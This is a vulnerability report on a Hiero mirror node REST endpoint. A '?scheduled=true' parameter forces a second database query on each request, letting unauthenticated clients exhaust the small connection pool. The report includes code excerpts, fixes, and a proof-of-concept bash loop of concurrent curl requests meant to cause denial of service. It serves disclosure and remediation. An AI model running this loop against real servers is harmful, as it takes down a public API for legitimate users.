### Title
Unauthenticated 2× DB Query Amplification via `mayMissLongTermScheduledTransaction()` Enables Connection Pool Exhaustion

### Summary
`getTransactionsByIdOrHash()` in `rest/transactions.js` unconditionally issues a second database query whenever `mayMissLongTermScheduledTransaction()` returns `true`. An unprivileged attacker can reliably trigger this condition — with zero prerequisites — by appending `?scheduled=true` to any syntactically valid transaction ID, causing both queries to return zero rows and a 404, while consuming two DB connections per request. With the default pool size of 10 connections and no rate limiting in the REST API layer, a small number of concurrent requests exhausts the pool and blocks all other DB-dependent API calls.

### Finding Description

**Exact code path:**

`getTransactionsByIdOrHash()` (lines 923–938) runs a first query, then calls `mayMissLongTermScheduledTransaction()` on the result. If it returns `true`, a second query is issued unconditionally:

```js
// rest/transactions.js lines 930-938
const {rows} = await pool.queryQuietly(query, params).then((result) => {
    if (!mayMissLongTermScheduledTransaction(isTransactionHash, scheduled, result.rows)) {
      return result;
    }
    params[params.upperConsensusTimestampIndex] =
      params[params.lowerConsensusTimestampIndex] + maxScheduledTransactionConsensusTimestampRangeNs;
    return pool.queryQuietly(query, params);   // ← second query always fires
  });
```

`mayMissLongTermScheduledTransaction()` (lines 974–996) has two branches that return `true`:

**Branch A (the question's focus — `scheduled === undefined`):**
```js
if (scheduled === undefined) {
    let scheduleExists = false;
    for (const transaction of transactions) {
      if (transaction.type === scheduleCreateProtoId && SUCCESS_PROTO_IDS.includes(transaction.result)) {
        scheduleExists = true;
      } else if (transaction.scheduled) {
        return false;
      }
    }
    return scheduleExists;   // true when DB returns a successful SCHEDULECREATE with no executed scheduled tx
}
```
Requires a real SCHEDULECREATE transaction in the DB (any publicly visible pending long-term scheduled transaction works; the window is up to 62 days per the `maxScheduledTransactionConsensusTimestampRange` default of `89285m`).

**Branch B (zero-prerequisite path — `scheduled === true`):**
```js
} else if (scheduled && transactions.length === 0) {
    return true;   // true whenever ?scheduled=true and no rows returned
}
```
This branch fires for **any** syntactically valid transaction ID with `?scheduled=true` appended, even completely fabricated ones that don't exist in the DB. The first query returns 0 rows → function returns `true` → second query fires → also returns 0 rows → `NotFoundError` thrown. Two DB connections consumed, 404 returned.

**Root cause / failed assumption:** The code assumes the second-query path is triggered only occasionally for legitimate long-term scheduled transaction lookups. There is no guard preventing an attacker from forcing this path on every request. The `cache` object imported at line 44 is not used in `getTransactionsByIdOrHash()`.

**No rate limiting in the REST API:** The throttle/rate-limit code (`ThrottleConfiguration`, `ThrottleManagerImpl`) lives exclusively in the `web3` Java module. The Node.js REST API has no per-IP or per-endpoint rate limiting applied to `GET /api/v1/transactions/:id`.

**Tiny default connection pool:** `hiero.mirror.rest.db.pool.maxConnections` defaults to **10** connections with a `connectionTimeout` of 20 000 ms.

### Impact Explanation

With a pool of 10 connections and 2× amplification per request, an attacker maintaining only ~5 concurrent long-running requests (each holding two connections for the duration of the 20 s statement timeout) exhausts the pool. All other REST API endpoints that require a DB connection (`/api/v1/accounts`, `/api/v1/blocks`, `/api/v1/balances`, etc.) begin queuing and eventually timing out. This degrades or halts the mirror node REST API entirely for all consumers, including downstream services that rely on it to confirm transaction finality.

### Likelihood Explanation

The Branch B exploit path requires:
- Knowledge of the transaction ID format (`{shard}.{realm}.{account}-{seconds}-{nanos}`) — publicly documented.
- Appending `?scheduled=true` — publicly documented query parameter.
- Sending concurrent HTTP requests — trivially scriptable with `curl`, `ab`, `wrk`, etc.

No account, token, fee, or privileged access is required. The attack is repeatable indefinitely and is not self-limiting (each request independently triggers the double query). The attacker does not need to observe any network state.

### Recommendation

1. **Short-term:** Add a guard in `getTransactionsByIdOrHash()` so the second query is only issued when the first query actually returned a SCHEDULECREATE row (Branch A). For Branch B (`scheduled=true`, 0 rows), skip the second query and return 404 immediately — there is no scheduled transaction to find.
2. **Medium-term:** Add per-IP rate limiting to the REST API (e.g., via an Express middleware such as `express-rate-limit`) for the `/api/v1/transactions/:id` endpoint.
3. **Long-term:** Enable the Redis response cache (`hiero.mirror.rest.cache.response.enabled`) so repeated lookups of the same transaction ID are served from cache without hitting the DB at all.

### Proof of Concept

```bash
# Fabricate any syntactically valid but non-existent transaction ID.
# ?scheduled=true guarantees Branch B fires → 2 DB queries → 404.
# Run 10 concurrent workers to exhaust the default pool of 10 connections.

for i in $(seq 1 10); do
  while true; do
    curl -s "https://<mirror-node>/api/v1/transactions/0.0.${i}-$(date +%s)-000000000?scheduled=true" \
      -o /dev/null
  done &
done
wait
```

Each loop iteration issues two DB queries (one with the narrow timestamp window, one with the extended `maxScheduledTransactionConsensusTimestampRangeNs` window). With 10 workers and a pool of 10 connections, legitimate API traffic begins receiving connection-timeout errors within seconds. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** rest/transactions.js (L930-938)
```javascript
  const {rows} = await pool.queryQuietly(query, params).then((result) => {
    if (!mayMissLongTermScheduledTransaction(isTransactionHash, scheduled, result.rows)) {
      return result;
    }

    params[params.upperConsensusTimestampIndex] =
      params[params.lowerConsensusTimestampIndex] + maxScheduledTransactionConsensusTimestampRangeNs;
    return pool.queryQuietly(query, params);
  });
```

**File:** rest/transactions.js (L974-996)
```javascript
const mayMissLongTermScheduledTransaction = (isTransactionHash, scheduled, transactions) => {
  // Note scheduled may be undefined
  if (isTransactionHash || scheduled === false) {
    return false;
  }

  if (scheduled === undefined) {
    let scheduleExists = false;
    for (const transaction of transactions) {
      if (transaction.type === scheduleCreateProtoId && SUCCESS_PROTO_IDS.includes(transaction.result)) {
        scheduleExists = true;
      } else if (transaction.scheduled) {
        return false;
      }
    }

    return scheduleExists;
  } else if (scheduled && transactions.length === 0) {
    return true;
  }

  return false;
};
```

**File:** rest/dbpool.js (L7-16)
```javascript
const poolConfig = {
  user: config.db.username,
  host: config.db.host,
  database: config.db.name,
  password: config.db.password,
  port: config.db.port,
  connectionTimeoutMillis: config.db.pool.connectionTimeout,
  max: config.db.pool.maxConnections,
  statement_timeout: config.db.pool.statementTimeout,
};
```

**File:** docs/configuration.md (L555-557)
```markdown
| `hiero.mirror.rest.db.pool.connectionTimeout`                            | 20000                   | The number of milliseconds to wait before timing out when connecting a new database client                                                                                                    |
| `hiero.mirror.rest.db.pool.maxConnections`                               | 10                      | The maximum number of clients the database pool can contain                                                                                                                                   |
| `hiero.mirror.rest.db.pool.statementTimeout`                             | 20000                   | The number of milliseconds to wait before timing out a query statement                                                                                                                        |
```
